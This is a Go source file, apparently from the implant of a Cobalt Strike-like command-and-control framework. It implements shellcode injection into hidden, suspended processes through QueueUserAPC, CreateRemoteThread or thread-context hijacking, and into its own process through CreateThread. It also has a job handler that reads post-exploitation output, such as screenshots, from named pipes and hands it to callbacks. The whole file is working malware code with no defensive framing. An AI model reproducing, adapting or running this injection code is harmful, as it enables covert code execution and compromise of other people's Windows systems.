//go:build windows

package packet

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/Microsoft/go-winio"
	"golang.org/x/sys/windows"
	"io"
	"main/util"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32            = windows.NewLazySystemDLL("kernel32.dll")
	ntdll               = windows.NewLazyDLL("ntdll.dll")
	VirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx    = kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	GetThreadContext    = kernel32.NewProc("GetThreadContext")
	SetThreadContext    = kernel32.NewProc("SetThreadContext")
	ResumeThread        = kernel32.NewProc("ResumeThread")
	QueueUserAPC        = kernel32.NewProc("QueueUserAPC")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	VirtualProtect      = kernel32.NewProc("VirtualProtect")
	RtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	CreateRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	GetProcessHeap      = kernel32.NewProc("GetProcessHeap")
	HeapWalk            = kernel32.NewProc("HeapWalk")
	SuspendThread       = kernel32.NewProc("SuspendThread")
	//HeapLock = kernel32.NewProc("HeapLock")
	//HeapUnlock = kernel32.NewProc("HeapUnlock")

	kernel32syscall, _ = syscall.LoadLibrary("kernel32.dll")
	HeapUnlock, _      = syscall.GetProcAddress(kernel32syscall, "HeapUnlock")
	HeapLock, _        = syscall.GetProcAddress(kernel32syscall, "HeapLock")
	//GetProcessHeap , _ = syscall.GetProcAddress(kernel32syscall, "GetProcessHeap")
	//HeapWalk , _ = syscall.GetProcAddress(kernel32syscall, "HeapWalk")

)

type CONTEXT struct {
	ContextFlags      uint32
	Dr0               uint32
	Dr1               uint32
	Dr2               uint32
	Dr3               uint32
	Dr6               uint32
	Dr7               uint32
	FloatSave         WOW64_FLOATING_SAVE_AREA
	SegGs             uint32
	SegFs             uint32
	SegEs             uint32
	SegDs             uint32
	Edi               uint32
	Esi               uint32
	Ebx               uint32
	Edx               uint32
	Ecx               uint32
	Eax               uint32
	Ebp               uint32
	Eip               uint32
	SegCs             uint32
	EFlags            uint32
	Esp               uint32
	SegSs             uint32
	ExtendedRegisters [512]byte
}

type WOW64_FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

func Spawn_APC(shellcode []byte, path string) ([]byte, error) {
	command := syscall.StringToUTF16Ptr(path)
	args := syscall.StringToUTF16Ptr("")
	startupInfo := new(syscall.StartupInfo)
	procInfo := new(syscall.ProcessInformation)
	startupInfo.ShowWindow = windows.SW_HIDE
	_ = syscall.CreateProcess(command, args, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)

	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc Failed")
		return nil, errors.New("VirtualAlloc Failed")
	} else {
		fmt.Println("Alloc: Success")
	}

	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteMemory.Error() != "The operation completed successfully." {
		fmt.Println("WriteMemory: Failed")
		return nil, errWriteMemory
	} else {
		fmt.Println("WriteMemory: Success")
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect.Error() != "The operation completed successfully." {
		fmt.Println("VirtualProtect: Failed")
		return nil, errVirtualProtect
	} else {
		fmt.Println("VirtualProtect: Success")
	}
	_, _, errQueueUserAPC := QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	if errQueueUserAPC.Error() != "The operation completed successfully." {
		fmt.Println("QueueUserAPC: Failed")
		return nil, errQueueUserAPC
	} else {
		fmt.Println("QueueUserAPC: Success")
	}
	_, _, errResumeThread := ResumeThread.Call(uintptr(procInfo.Thread))
	if errResumeThread != nil {
		fmt.Println(errResumeThread)
	}
	return []byte("Spawn success"), nil
}

func Spawn_Remote(shellcode []byte, path string) ([]byte, error) {

	command := syscall.StringToUTF16Ptr(path)
	args := syscall.StringToUTF16Ptr("")
	startupInfo := new(syscall.StartupInfo)
	procInfo := new(syscall.ProcessInformation)
	startupInfo.ShowWindow = windows.SW_HIDE
	_ = syscall.CreateProcess(command, args, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)

	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc Failed")
		return nil, errors.New("VirtualAlloc Failed")
	} else {
		fmt.Println("Alloc: Success")
	}

	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteMemory.Error() != "The operation completed successfully." {
		fmt.Println("WriteMemory: Failed")
		return nil, errWriteMemory
	} else {
		fmt.Println("WriteMemory: Success")
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect.Error() != "The operation completed successfully." {
		fmt.Println("VirtualProtect: Failed")
		return nil, errVirtualProtect
	} else {
		fmt.Println("VirtualProtect: Success")
	}

	_, _, errCreateRemoteThreadEx := CreateRemoteThread.Call(uintptr(procInfo.Process), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		fmt.Println("VirtualProtect: Failed")
		return nil, errCreateRemoteThreadEx
	} else {
		fmt.Println("VirtualProtect: Success")
	}

	return []byte("Spawn success"), nil
}

func Spawn(shellcode []byte, path string) ([]byte, error) {

	command := syscall.StringToUTF16Ptr(path)
	args := syscall.StringToUTF16Ptr("")
	startupInfo := new(syscall.StartupInfo)
	procInfo := new(syscall.ProcessInformation)
	startupInfo.ShowWindow = windows.SW_HIDE
	_ = syscall.CreateProcess(command, args, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)

	addr, _, err := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc Failed")
		return nil, errors.New("VirtualAlloc Failed")
	}
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	_, _, err = WriteProcessMemory.Call(uintptr(procInfo.Process), addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, err = VirtualProtectEx.Call(uintptr(procInfo.Process), addr,
		uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	var context CONTEXT
	context.ContextFlags = 0x00000002

	_, _, err = GetThreadContext.Call(uintptr(procInfo.Thread), uintptr(unsafe.Pointer(&context)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	context.Eax = uint32(addr)

	_, _, err = SetThreadContext.Call(uintptr(procInfo.Thread), uintptr(unsafe.Pointer(&context)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	_, _, err = ResumeThread.Call(uintptr(procInfo.Thread))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	return []byte("Spawn success"), nil

}

func InjectSelf(shellcode []byte) ([]byte, error) {
	process, err := windows.GetCurrentProcess()
	if err != nil {
		return nil, errors.New("GetCurrentProcess failed")
	}

	addr, _, err := VirtualAllocEx.Call(uintptr(process), 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc Failed")
		return nil, errors.New("VirtualAlloc Failed")
	}
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	_, _, err = WaitForSingleObject.Call(thread, 1000)
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	return []byte("Injectself success"), nil

}

func HandlerJob(b []byte) ([]byte, error) {

	buf := bytes.NewBuffer(b)
	_, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	//_ = util.ParseAnArg(buf)
	callbackTypeByte := make([]byte, 2)
	sleepTimeByte := make([]byte, 2)
	_, _ = buf.Read(callbackTypeByte)
	_, _ = buf.Read(sleepTimeByte)
	callbackType := int(ReadShort(callbackTypeByte))

	sleepTime := ReadShort(sleepTimeByte)
	pipeName, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}

	//pipeName := util.ParseAnArg(buf)
	pipeName = bytes.Trim(pipeName, "\x00")
	_, err = util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	//_ = util.ParseAnArg(buf)

	time.Sleep(time.Second)

	if callbackType == CALLBACK_SCREENSHOT {
		result, err := ReadNamedPipeAll(pipeName)

		if result != "" {
			DataProcess(callbackType, []byte(result[4:]))
		} else {
			ErrorProcess(errors.New("result error"))
		}

		if err != nil {
			return nil, err
		}
		return []byte("Job success"), nil
	}

	jobWithCallback(pipeName, callbackType, sleepTime, func(result []byte) {
		DataProcess(callbackType, result)
	})

	return []byte("Hold on"), nil
}

func ReadNamedPipe(pipeName []byte, callbackType int, sleepTime uint16) (string, error) {
	pipe, err := winio.DialPipe(string(pipeName), nil)
	if err != nil {
		fmt.Println(err)
		return "", err
	}
	defer pipe.Close()
	result := ""
	buf := make([]byte, 512*10)
	for {
		n, err := pipe.Read(buf)
		if err != nil {
			if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
				fmt.Printf("read error: %v\n", err)
			}
			break
		}
		if n > 0 {
			DataProcess(callbackType, buf[:n])
			time.Sleep(time.Millisecond * time.Duration(sleepTime))
		}
		result += string(buf[:n])
	}
	return result, nil
}

func ReadNamedPipeAll(pipeName []byte) (string, error) {
	pipe, err := winio.DialPipe(string(pipeName), nil)
	if err != nil {
		fmt.Println(err)
		return "", err
	}
	defer pipe.Close()
	result := ""
	buf := make([]byte, 512*10)
	for {
		n, err := pipe.Read(buf)
		if err != nil {
			if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
				fmt.Printf("read error: %v\n", err)
			}
			break
		}
		result += string(buf[:n])
	}
	return result, nil
}

func jobWithCallback(pipeName []byte, callbackType int, sleepTime uint16, callback func(result []byte)) {
	go func() {
		result, err := ReadNamedPipe(pipeName, callbackType, sleepTime)
		if err != nil {
			ErrorProcess(err)
			return
		}
		callback([]byte(result))
	}()
}
